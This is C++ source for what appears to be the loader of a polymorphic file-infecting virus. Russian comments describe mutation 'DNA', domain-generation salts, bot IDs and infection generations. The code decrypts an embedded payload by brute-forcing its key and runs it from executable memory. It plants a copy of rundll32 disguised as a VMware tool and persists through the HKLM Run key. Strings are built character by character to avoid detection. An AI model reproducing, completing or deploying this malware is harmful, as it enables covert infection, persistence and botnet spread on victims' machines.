#define _UNICODE
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
//#include <iostream>
#include <stdio.h>
#include <ShlObj.h>
#include "cryptstruct.hpp"
#pragma comment(lib, "shlwapi.lib")



typedef enum dna_fields_
{
	// флаг о том нужно ли нам использовать фикс энтропии
	USE_ENTROPYFIX = 0,
	// параметр фикса энтропии
	ENTROPYFIX_PARAMETER,
	// флаг использовать трешкод или нет
	USE_TRASHCODE,
	// параметр трешкода
	TRASHCODE_PARAM,
	// сид кодового генератора
	CODEGEN_SEED,
	// сид генератора алгоритма шифрования
	POLYENC_SEED,
	// сид перехватчика управления
	HOOK_SEED,
	// тип окончания стартап-кода: т.к у нас вставляется в восстановлении трамплин после стартапкода мы можем записать любой мусор 
	STARTUP_ENDCODE_TYPE,
	// соль для сида DGA: смещает сид на определенное значения, создавая новые пулы доменов в зависимости от мутации
	DGA_SALT,
	// красная граница активации мутатора
	MUTATOR_BORDER,
	// техническое значение - всего элементов
	DNA_FIELDS_TOTAL
} dna_fields_t;


// расширенная инфа о капсиде
#pragma pack(1)
struct capsid_extended
{
	WCHAR parentBotId[128]; // айди бота который заразил данный екзешник
	DWORD32 dwGenCounter; // счетчик поколения заражений 
	DWORD32 dwDNAMutatorCounter; // счетчик количества мутаций ДНК
	DWORD32 dwWayInfected; // флаг о том по какому пути произошло заражение
	DWORD32 dwDNA[dna_fields_t::DNA_FIELDS_TOTAL];
};
#pragma pack()

// структура метаданных капсида вируса, следом за ней идут разрядности ядер
#pragma pack(1)
struct capsid_metadata
{
	DWORD32 x86_size;
	DWORD32 x64_size;
	DWORD32 offset_x86core;
	DWORD32 offset_x86entry;
	DWORD32 offset_x64core;
	DWORD32 offset_x64entry;
	DWORD32 size; // размер капсида: метаданные + дллки ядра
				  // ключ шифрования data_extended структуры - одноразовый блокнот
	unsigned char extended_key[sizeof(capsid_extended)];
	capsid_extended data_extended;
};
#pragma pack()


typedef VOID(WINAPI *fnEntry)(capsid_metadata *);

BOOL read2buf(PWCHAR pwFileName, LPBYTE *lpOutput, PDWORD pdwBufferSize)
{
	HANDLE hFile = CreateFileW(pwFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	BOOL bRet = FALSE;
	DWORD dwRead;
	DWORD dwFileSize = 0;
	do
	{
		dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize == 0)
			break;

		*lpOutput = new BYTE[dwFileSize + 1];
		if (*lpOutput == nullptr)
			break;

		bRet = ReadFile(hFile, *lpOutput, dwFileSize, &dwRead, NULL);
		*pdwBufferSize = dwFileSize;

	} while (FALSE);
	CloseHandle(hFile);

	return bRet;
}

BOOL dump2file(PWCHAR pwFileName, LPBYTE lpBuffer, DWORD dwFileSize)
{
	HANDLE hFile = CreateFileW(pwFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWritten;
	BOOL bRet = WriteFile(hFile, lpBuffer, dwFileSize, &dwWritten, NULL);

	CloseHandle(hFile);

	return bRet;
}

BOOL CreateVmTools(PWCHAR pwFilePath)
{
	LPBYTE lpFileBuffer = nullptr;
	DWORD dwFileSize = 0;
	BOOL bRet = FALSE;
	WCHAR wchRundll32[] = { L'\\', L'r', L'u', L'n', L'd', L'l', L'l', L'3', L'2', L'.', L'e', L'x', L'e', L'\0' };
	
	WCHAR wchPath[MAX_PATH + 1];

	RtlSecureZeroMemory(wchPath, sizeof(wchPath));
	do
	{
		if (GetSystemDirectoryW(wchPath, MAX_PATH) == NULL)
			break;

		wcsncat(wchPath, wchRundll32, MAX_PATH);

		if (!read2buf(wchPath, &lpFileBuffer, &dwFileSize))
			break;

		if (!dump2file(pwFilePath, lpFileBuffer, dwFileSize))
			break;

		bRet = TRUE;

	} while (FALSE);

	if (lpFileBuffer != nullptr)
		delete[]lpFileBuffer;

	return bRet;
}

PWCHAR CreateDummyFile()
{
	PWCHAR pwchPath = nullptr;
	WCHAR wchFileName[] = { L'\\', L'v', L'm', L't', L'o', L'o', L'l', L's', L'd', L'.', L'e', L'x', L'e', L'\0'};
	WCHAR wchDirName[] = { L'\\', L'V', L'M', L'w', L'a', L'r', L'e', L'\0'};
	BOOL bRet = FALSE;
	do
	{
		pwchPath = new WCHAR[MAX_PATH + 256 + 2];
		if (pwchPath == nullptr)
			break;

		if (!SHGetSpecialFolderPathW(NULL, pwchPath, CSIDL_PROGRAM_FILES, TRUE))
			break;

		wcsncat(pwchPath, wchDirName, MAX_PATH + 1);

		if ((!CreateDirectoryW(pwchPath, NULL)) && (GetLastError() != ERROR_ALREADY_EXISTS))
			break;

		wcsncat(pwchPath, wchFileName, MAX_PATH + 1 );
		
		if (!CreateVmTools(pwchPath))
			break;

		UINT iLength = wcslen(pwchPath) + 1024;
		PWCHAR pwResult = new WCHAR[iLength + 1];
		if (pwResult == nullptr)
			break;

		RtlSecureZeroMemory(pwResult, iLength * sizeof(WCHAR));

		pwResult[0] = L'\"';
		wcscat(pwResult, pwchPath);
		pwResult[wcslen(pwResult)] = L'\"';

		delete[]pwchPath;
		pwchPath = pwResult;

		bRet = TRUE;

	} while (FALSE);

	if ((!bRet) && (pwchPath != nullptr))
	{
		delete[]pwchPath;
		pwchPath = nullptr;
	}

	return pwchPath;
}

BOOL vaccine()
{
	OutputDebugStringW(L"[m0yv] setting vaccine to trigger anti-vm");

	PWCHAR pwchPath = nullptr;
	WCHAR key_path[] = { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n', '\\', L'R', L'u', L'n', '\0' };
	WCHAR wchValue[] = { L'v', L'm', L'w', L'a', L'r', L'e', L'\0'};

	WCHAR wchArgs[] = { L' ', L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L',',L'S',L'l',L'e',L'e',L'p', L'\0'};
	
	BOOL bRet = FALSE;
	HKEY hKey = NULL;
	do
	{
		pwchPath = CreateDummyFile();
		if (pwchPath == nullptr)
			break;

		wcsncat(pwchPath, wchArgs, MAX_PATH + 256);

		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, key_path, NULL, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			break;

		if (RegSetValueExW(hKey, wchValue, NULL, REG_SZ, (LPBYTE)pwchPath, wcslen(pwchPath) * 2 + 2) != ERROR_SUCCESS)
			break;

		bRet = TRUE;

	} while (FALSE);

	if (hKey)
		RegCloseKey(hKey);

	if (pwchPath != nullptr)
		delete[]pwchPath;

	return bRet;
}

#define TARGET_KEY 0xAC829D39


VOID SubDword(LPBYTE lpBuffer, DWORD dwBufSize, DWORD dwKey)
{
	PDWORD pdwBuf = (PDWORD)lpBuffer;
	for (UINT i = 0; i < (dwBufSize / sizeof(DWORD)); i++)
	{
		pdwBuf[i] -= dwKey;
		dwKey++;
	}
}

LPBYTE DecryptBlock(LPBYTE lpNewBuffer, DWORD dwBufferSize)
{

	WCHAR wchDbg[1024];

	crypted_data *cd = (crypted_data*)lpNewBuffer;
	LPBYTE lpDecryptBlock = (LPBYTE)VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpDecryptBlock == nullptr)
		return nullptr;

	DWORD dwInitialKey = TARGET_KEY - 5000;
	unsigned char hash[512 / 8];
	for (;;)
	{
		memcpy(lpDecryptBlock, &cd->block[0], dwBufferSize - offsetof(crypted_data, block));
		SubDword(lpDecryptBlock, dwBufferSize - offsetof(crypted_data, block), dwInitialKey);

		sha512(lpDecryptBlock, dwBufferSize - offsetof(crypted_data, block), hash);

		if (!memcmp(hash, cd->hash, sizeof(hash)))
			break;
		
		wsprintfW(wchDbg, L"[m0yv] brute key 0X%X invalid hash in result buffer", dwInitialKey);
		OutputDebugStringW(wchDbg);

		dwInitialKey++;
	}

	OutputDebugStringW(L"[m0yv] decrypted buffer");

	return lpDecryptBlock;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	do
	{
		HRSRC src = FindResourceW(NULL, MAKEINTRESOURCEW(102), MAKEINTRESOURCEW(10));
		if (src == NULL)
			break;

		HGLOBAL hRes = LoadResource(NULL, src);
		if (hRes == NULL)
			break;

		DWORD dwResSize = SizeofResource(NULL, src);


		LPBYTE lpNewBuffer = DecryptBlock((LPBYTE)hRes, dwResSize);

		vaccine();
		
		OutputDebugStringW(L"[m0yv] loading to memory");

		capsid_metadata *capsidStruct = (capsid_metadata*)lpNewBuffer;
#ifndef _WIN64
		fnEntry entry = (fnEntry)&capsid::rawData[capsidStruct->offset_x86entry];
		entry(capsidStruct);
#else
		fnEntry entry = (fnEntry)&((LPBYTE)lpNewBuffer)[capsidStruct->offset_x64entry];
		entry(capsidStruct);
#endif

		Sleep(10 * 60 * 1000);
		

	} while (FALSE);

	return 0;
}